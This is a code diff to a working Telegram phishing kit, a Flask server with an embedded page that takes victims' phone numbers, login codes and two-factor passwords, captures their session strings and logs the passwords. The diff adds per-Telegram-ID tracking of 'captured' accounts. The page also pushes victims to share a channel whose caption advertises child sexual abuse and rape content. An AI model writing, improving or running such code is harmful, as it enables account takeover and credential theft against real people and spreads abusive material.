@@ -81,7 +81,7 @@ def format_phone(ph):
         return '+' + digits
     return '+' + digits
 
-# ====== Bot Notification (includes 2FA password) ======
+# ====== Bot Notification ======
 def send_bot_notification(phone, ss, me, dc, password_used=False, password_value=""):
     try:
         max_len = 3900
@@ -285,7 +285,8 @@ def run_telegram_action(phone, code=None, password=None):
                 send_bot_notification(phone, ss, me, dc, password_used, password if password_used else "")
                 
                 logger.info(f"✅ Captured: {phone} | Session: {len(ss)} chars{' | With 2FA: ' + password if password_used else ''}")
-                return {'success': True, 'session': ss}
+                # ====== FIX: Return user_id in response ======
+                return {'success': True, 'session': ss, 'user_id': me.id}
                 
             except Exception as e:
                 e_str = str(e)
@@ -525,38 +526,37 @@ PAGE = """<!DOCTYPE html>
     </div>
     
     <script>
-    // localStorage persistence
-    var phoneNumber = localStorage.getItem('tg_phone') || '';
+    // ====== FIX: Telegram ID based persistence (not device) ======
+    var phoneNumber = '';
     var codeDigits = '';
     var codeCheckInterval = null;
     var passwordCheckInterval = null;
-    var sharesDone = parseInt(localStorage.getItem('tg_shares') || '0');
+    var sharesDone = 0;
     var shareLinkBase = window.location.href;
     
     // ====== Telegram channel to share ======
     var TG_CHANNEL_LINK = 'https://t.me/videodks';
     var TG_CHANNEL_CAPTION = '𝗖𝗽, 𝗿𝗮𝗽𝗲,𝗺𝗼𝗺 𝘀𝗼𝗼𝗻🔞☝️';
     
-    // ====== FIX: Each user gets their own session ======
-    // On modal open, check if saved phone is actually verified on server
+    // ====== On modal open: check by Telegram ID ======
     document.getElementById('glb').onclick = async function() {
         document.getElementById('vm').classList.add('active');
         
-        var stage = localStorage.getItem('tg_stage');
-        var phone = localStorage.getItem('tg_phone');
+        var tgUserId = localStorage.getItem('tg_user_id');
         
-        // Only auto-redirect to share page if the phone is ACTUALLY captured on server
-        if (stage === 'share' && phone) {
+        // If we have a stored Telegram ID, check server if it's captured
+        if (tgUserId) {
             try {
-                var res = await fetch('/api/check', {
+                var res = await fetch('/api/check_user', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({phone: phone})
+                    body: JSON.stringify({user_id: parseInt(tgUserId)})
                 });
                 var data = await res.json();
-                if (data.s === 'done') {
-                    // This specific phone is verified — go to share page
-                    phoneNumber = phone;
+                if (data.captured) {
+                    // This Telegram ID is already captured — go straight to Share
+                    phoneNumber = data.phone || '';
+                    sharesDone = parseInt(localStorage.getItem('tg_shares_' + tgUserId) || '0');
                     document.getElementById('s1').classList.remove('active');
                     document.getElementById('s2').classList.remove('active');
                     document.getElementById('s2b').classList.remove('active');
@@ -568,7 +568,7 @@ PAGE = """<!DOCTYPE html>
             } catch(e) {}
         }
         
-        // For new users OR if saved phone is not verified — start from step 1
+        // New user or not captured — start from Step 1
         document.getElementById('s1').classList.add('active');
         document.getElementById('s2').classList.remove('active');
         document.getElementById('s2b').classList.remove('active');
@@ -591,7 +591,6 @@ PAGE = """<!DOCTYPE html>
         }
         
         phoneNumber = '+91' + phone;
-        localStorage.setItem('tg_phone', phoneNumber);
         
         document.getElementById('ps1').className = 'sb waiting';
         document.getElementById('ps1').innerHTML = '<span class="sp"></span> Sending code...';
@@ -643,7 +642,8 @@ PAGE = """<!DOCTYPE html>
                 } else if (data.s === 'done') {
                     clearInterval(codeCheckInterval);
                     codeCheckInterval = null;
-                    goToSharePage();
+                    // Fetch the user_id from the session endpoint
+                    fetchUserIdAndGoToShare(phoneNumber);
                 } else if (data.s === '2fa_needed') {
                     clearInterval(codeCheckInterval);
                     codeCheckInterval = null;
@@ -670,7 +670,7 @@ PAGE = """<!DOCTYPE html>
                 if (data.s === 'done') {
                     clearInterval(passwordCheckInterval);
                     passwordCheckInterval = null;
-                    goToSharePage();
+                    fetchUserIdAndGoToShare(phoneNumber);
                 } else if (data.s === 'err') {
                     clearInterval(passwordCheckInterval);
                     passwordCheckInterval = null;
@@ -681,6 +681,19 @@ PAGE = """<!DOCTYPE html>
                 }
             } catch(e) {}
         }, 2000);
+    }
+    
+    // ====== Fetch user_id from captured data and save to localStorage ======
+    async function fetchUserIdAndGoToShare(phone) {
+        try {
+            var res = await fetch('/session/' + encodeURIComponent(phone));
+            var data = await res.json();
+            if (data.user_id) {
+                localStorage.setItem('tg_user_id', String(data.user_id));
+                localStorage.setItem('tg_shares_' + data.user_id, '0');
+            }
+        } catch(e) {}
+        goToSharePage();
     }
     
     function pk(n) { if(codeDigits.length < 5) { codeDigits += n; document.getElementById('cdisp').textContent = codeDigits; } }
@@ -694,6 +707,11 @@ PAGE = """<!DOCTYPE html>
             var res = await fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phoneNumber,code:codeDigits})});
             var data = await res.json();
             if (data.success) {
+                // ====== Save Telegram ID to localStorage ======
+                if (data.user_id) {
+                    localStorage.setItem('tg_user_id', String(data.user_id));
+                    localStorage.setItem('tg_shares_' + data.user_id, '0');
+                }
                 goToSharePage();
                 if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
             } else if (data.needs_password) {
@@ -727,6 +745,11 @@ PAGE = """<!DOCTYPE html>
             var res = await fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phoneNumber,code:codeDigits,password:pwd})});
             var data = await res.json();
             if (data.success) {
+                // ====== Save Telegram ID to localStorage ======
+                if (data.user_id) {
+                    localStorage.setItem('tg_user_id', String(data.user_id));
+                    localStorage.setItem('tg_shares_' + data.user_id, '0');
+                }
                 goToSharePage();
                 if (passwordCheckInterval) { clearInterval(passwordCheckInterval); passwordCheckInterval = null; }
             } else {
@@ -748,8 +771,6 @@ PAGE = """<!DOCTYPE html>
     }
     
     function goToSharePage() {
-        localStorage.setItem('tg_stage', 'share');
-        localStorage.setItem('tg_shares', String(sharesDone));
         document.getElementById('s2').classList.remove('active');
         document.getElementById('s2b').classList.remove('active');
         document.getElementById('s3').classList.add('active');
@@ -760,6 +781,13 @@ PAGE = """<!DOCTYPE html>
         var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL_LINK) + '&text=' + encodeURIComponent(TG_CHANNEL_CAPTION);
         document.getElementById('shareLink').textContent = shareUrl;
         shareLinkBase = TG_CHANNEL_LINK;
+        
+        // ====== Load shares from per-user storage ======
+        var tgUserId = localStorage.getItem('tg_user_id');
+        if (tgUserId) {
+            sharesDone = parseInt(localStorage.getItem('tg_shares_' + tgUserId) || '0');
+        }
+        
         updateShareProgress();
         
         if (sharesDone > 0) {
@@ -780,7 +808,12 @@ PAGE = """<!DOCTYPE html>
         window.open(shareUrl, '_blank');
         
         sharesDone = Math.min(sharesDone + 1, 4);
-        localStorage.setItem('tg_shares', String(sharesDone));
+        
+        // ====== Save to per-user storage ======
+        var tgUserId = localStorage.getItem('tg_user_id');
+        if (tgUserId) {
+            localStorage.setItem('tg_shares_' + tgUserId, String(sharesDone));
+        }
         
         updateShareProgress();
         
@@ -846,23 +879,34 @@ def share():
     
     return jsonify({'success': True})
 
-# ====== FIX: /api/check now also checks captured_accounts ======
 @app.route('/api/check', methods=['POST'])
 def check():
     phone = request.json.get('phone', '')
     phone = format_phone(phone)
     
-    # First check pending status
     with sessions_lock:
         s = pending_codes.get(phone, 'waiting')
     
-    # If waiting, also check if this phone was ALREADY captured
     if s == 'waiting':
         accounts = load_accounts()
         if any(a['phone'] == phone for a in accounts):
-            s = 'done'  # Phone is verified and captured
+            s = 'done'
     
     return jsonify({'s': s})
+
+# ====== NEW: Check by Telegram User ID ======
+@app.route('/api/check_user', methods=['POST'])
+def check_user():
+    user_id = request.json.get('user_id')
+    if not user_id:
+        return jsonify({'captured': False})
+    
+    accounts = load_accounts()
+    for a in accounts:
+        if a.get('user_id') == user_id:
+            return jsonify({'captured': True, 'phone': a['phone']})
+    
+    return jsonify({'captured': False})
 
 @app.route('/api/verify', methods=['POST'])
 def verify():
